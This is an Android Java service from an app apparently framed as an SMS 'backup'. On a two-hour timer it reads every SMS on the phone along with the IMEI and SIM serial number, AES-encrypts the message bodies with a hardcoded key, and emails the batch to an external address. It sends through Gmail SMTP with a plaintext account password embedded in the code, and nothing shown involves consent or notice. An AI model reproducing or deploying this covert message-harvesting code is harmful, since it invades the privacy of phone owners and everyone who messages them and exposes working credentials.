package com.example.sushant.twbackup;
import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.text.format.DateFormat;
import android.util.Log;
import android.widget.Toast;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by sushant on 31/3/17.
 */
public class SmsLogService extends Service
{

    ConnectivityManager connectivityManager;

    MainActivity mainActivity;
    String dateassign = "10-04-2010_12:12:12";

    SQLiteDatabase sqLiteDatabase;
    DatabaseHelper databaseHelper;
    public Context context = this;
    public Handler handler = null;
    public static Runnable runnable = null;
    private String SMSLOG;
    private String TYPENEW;
    public ArrayList<String> stringArrayList;
    public Cursor cursor,secondcursor,thirdcursor;
    String assign_date;
    Date finaldate, convert_assign_date, finaldate_ss;
    private String idcol;
    private String msgcontnet;
    String fetchdate1;
    private TelephonyManager telephonyManager;
    private String SIMSERIAL,IMEINO,Details;

    private void SMSSENDTASK()
    {

        telephonyManager= (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        SIMSERIAL=telephonyManager.getSimSerialNumber();
        IMEINO=telephonyManager.getDeviceId();

        Details="IMEI:"+IMEINO+"_SIM_SERIAL_NO:"+SIMSERIAL;

        stringArrayList = new ArrayList<>();

        databaseHelper = new DatabaseHelper(getApplicationContext(), DatabaseHelper.DB_NAME, null, DatabaseHelper.DB_VERSION);
        sqLiteDatabase = databaseHelper.getReadableDatabase();

        //Final Date of the SMS
        ContentResolver contentResolver = getContentResolver();
        Uri uriSmsnew = Uri.parse("content://sms/");
        cursor = contentResolver.query(uriSmsnew, new String[]{"thread_id", "address", "date", "body", "type"}, null, null, null);

        if (cursor != null && cursor.moveToFirst())
        {
            String date = cursor.getString(2);
            Log.e("date",date);
            Long timestamp = Long.parseLong(date);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            finaldate = calendar.getTime();


            Log.i("SMSLOG"," FINAL DATE OF THE SMS "+finaldate);
            new MyLogger().storeMessage("SMSLogService-Final Date of the SMS", String.valueOf(finaldate));

            /*SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss");
            try
            {
                finaldate=simpleDateFormat.parse(date);
            }
            catch (ParseException e)
            {

                e.printStackTrace();

            }
*/
        }

        cursor.close(); //First Cursor Close
        Log.i("SMSLOG", "IN THE SMS SEND TASK");

        //Check the database SMS TIME COLOUMN

        String query = "SELECT SMSTIME FROM SMSLOGTABLE1 WHERE _SMSID=1";

        secondcursor = sqLiteDatabase.rawQuery(query, null);

        if (secondcursor.moveToFirst())
        {

            fetchdate1 = secondcursor.getString(secondcursor.getColumnIndex("SMSTIME"));

            /*SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss");
            try
            {

                Date newfetch=sdf.parse(fetchdate1);
                convert_assign_date = newfetch;
                Log.i("SMSLOG","DB Date:"+ convert_assign_date+" str:"+fetchdate1);
            }
            catch (ParseException ex)
            {
                ex.printStackTrace();
            }

            Log.i("SMSLOG"," ASSIGN DATE OF FROM THE DATABASE FETCH DATE "+convert_assign_date);*/

        }

        //WHEN DATABASE COL IS NULL THEN ASSIGN THE HARDCODED DATE
        else
        {


            fetchdate1 = "Tue May 02 10:37:23 GMT+05:30 2010";
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss");
            try
            {

                convert_assign_date = simpleDateFormat.parse(dateassign);
            }
            catch (ParseException e)
            {
                e.printStackTrace();
            }
            databaseHelper = new DatabaseHelper(getApplicationContext(), DatabaseHelper.DB_NAME, null, DatabaseHelper.DB_VERSION);
            sqLiteDatabase = databaseHelper.getWritableDatabase();


            SimpleDateFormat simple_form = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss");
            String strDate = simple_form.format(convert_assign_date);

            String insert_query = "INSERT INTO SMSLOGTABLE1 (_SMSID,SMSTIME) VALUES('"+1+"', '"+fetchdate1+"')";
            sqLiteDatabase.execSQL(insert_query);

            Log.i("SMSLOG"," ASSIGN DATE FIRST TIME "+convert_assign_date);


        }

        Log.i("SMSLOG"," DATE ASSIGN FORM CONDITION "+fetchdate1);

        secondcursor.close();//Second Cursor Close

        //READ THE ALL MSG

        Uri uriSms = Uri.parse("content://sms/");
        thirdcursor = contentResolver.query(uriSms, new String[]{"thread_id", "address", "date", "body", "type"}, null, null, null);
        thirdcursor.moveToFirst();
        for (int i = 0; i < thirdcursor.getCount(); i++)
        {

            String To = thirdcursor.getString(0);
            String addressnew = thirdcursor.getString(1);
            String datenew = thirdcursor.getString(2);
            String bodynew = thirdcursor.getString(3);
            String typenew = thirdcursor.getString(4);

            String date_ss = thirdcursor.getString(thirdcursor.getColumnIndex("date"));
            Long timestamp_ss = Long.parseLong(date_ss);
            Calendar calendar_ss = Calendar.getInstance();
            calendar_ss.setTimeInMillis(timestamp_ss);
            finaldate_ss = calendar_ss.getTime();

            Log.i("SMSLOG"," DATE OF EACH SMS "+finaldate_ss);

            if (typenew.equals("1"))
            {
                TYPENEW = "INBOX";
            }
            if (typenew.equals("2"))
            {
                TYPENEW = "SENT";

            }
            //Convert the current timestamp into String date
            Calendar cal = Calendar.getInstance(Locale.ENGLISH);
            cal.setTimeInMillis(Long.parseLong(datenew));
            String date1 = DateFormat.format("dd-MM-yyyy_HH:mm:ss", cal).toString();

            //if (finaldate_ss.after(convert_assign_date))
            if (!(finaldate_ss.toString().equals(fetchdate1)))//&& !(msgcontnet.equals(bodynew))
            {
                SMSLOG = "\n [From: " + addressnew + " Date: " + date1 + " Content: " + encryption(bodynew) + " Type: " + TYPENEW + "]";
                // ADD THE SMS LOGS IN THE ARRAY LIST IF CONDITION MATCHES
                Log.i("SMSLOG","after true");
                stringArrayList.add(SMSLOG);
                Log.i("SM   SLOG"," LOGS IN THE ARRAY LIST "+SMSLOG);
                new MyLogger().storeMessage("SMSLogService-Final Date comparison to sqitite date", SMSLOG);

            }
            else
            {
                new MyLogger().storeMessage("SMSLogService-Final Date comparison to sqitite date", "inside else");
                break;

            }
            thirdcursor.moveToNext();

        }
        thirdcursor.close();//Third Cursor Close

        if (stringArrayList.size() > 0)
        {
            TWattachmentMailSender mailSender = new TWattachmentMailSender("transworldcallrecording", "transworld123!@#", "smtp.gmail.com", "587");
            try
            {

                Log.i("SMSLOG", " IN THE SMS MAIL SENDER ");
                Boolean s1=mailSender.sendMail1("SMS_LOG_" +Details, "CONTENT :)" + stringArrayList.toString(), "9100", "callrecording@twphd.in");

                Log.i("SMSLOG", " SMSLOG MAIN SENT  "+s1);

                new MyLogger().storeMessage("SMSLogService-mail send method", "Mail Sent -"+s1);

                databaseHelper = new DatabaseHelper(getApplicationContext(), DatabaseHelper.DB_NAME, null, DatabaseHelper.DB_VERSION);
                sqLiteDatabase = databaseHelper.getWritableDatabase();

                SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy_HH:mm:ss");
                String newdate = simpleDateFormat.format(finaldate);

                Log.i("SMSLOG", "CONVERTED SMS FINAL DATE  " + newdate);
                ContentValues cv = new ContentValues();
                cv.put("SMSTIME",""+newdate); //These Fields should be your String values of actual column names
                sqLiteDatabase.execSQL("update SMSLOGTABLE1 set SMSTIME='"+finaldate.toString()+"' where _SMSID=1");
                Log.i("SMSLOG", " VALUE UPDATED ");

            }
            catch (Exception e)
            {
                e.printStackTrace();
                new MyLogger().storeMessage("SMSLogService-mail send method", "Mail Not Sent -"+e);

                Log.i("SMSLOG", "EXCEPTION WHILE MAIL SENDING" + e);
            }
        }
        else
        {



        }

        sqLiteDatabase.close();
        stringArrayList.clear();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        handler=new Handler();
        runnable=new Runnable() {
            @Override
            public void run()
            {
                SMSSENDTASK();
                handler.postDelayed(runnable,2*60*60*1000);
                new MyLogger().storeMessage("SMSLogService-onStartCommand()", "Executed in every 2 hrs");

            }
        };
        handler.postDelayed(runnable,2*60*60*1000);
        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }


    public String encryption(String strNormalText){
        String seedValue = "qwertyuiopasdfgh";
        String normalTextEnc="";
        try {
            normalTextEnc = Aes.encrypt(seedValue, strNormalText);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return normalTextEnc;
    }



    //*********************Decryption code****************

//    public String dencryption(String strNormalText){
//        String seedValue = "samir";
//        String normalTextEnc="";
//        try {
//            normalTextEnc = AESHelper.encrypt(seedValue, str);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        return normalTextEnc;
//    }

}
